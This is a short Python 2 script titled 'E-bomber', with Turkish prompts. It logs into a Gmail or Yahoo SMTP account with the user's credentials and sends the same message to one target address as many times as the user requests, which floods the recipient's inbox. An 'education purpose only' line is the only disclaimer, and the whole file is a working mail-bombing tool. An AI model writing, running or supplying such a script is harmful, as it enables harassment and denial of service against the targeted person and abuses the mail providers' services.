#!/usr/bin/python
#E-bomber
#This code for education purpose only.
#Use it at your own risk !!!



import os
import smtplib
import getpass
import sys


server = raw_input ('Server Secin(gmail/yahoo): ')
user = raw_input('Gonderilecek Adres: ')
passwd = getpass.getpass('Parola: ')


to = raw_input('\nTo: ')
#subject = raw_input('Subject: ') 
body = raw_input('Mesaj: ')
total = input('Atmak istediginiz mail sayisi: ')

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
#elif server == 'cock':
    #smtp_server = 'smtp.mail.cock.li'
    #port = 587
else:
    print 'Sadece (gmail ve yahoo) gecerlidir.'
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        #subject = os.urandom(1)
        msg = 'From: '+ user + '\n' + body
        server.sendmail(user,to,msg)
        print "\rE-mails sent: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n Basarili!'
except KeyboardInterrupt:
    print '[-] Cancelled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] Girdiginiz kullanici adi veya sifre hatali.'
    sys.exit()
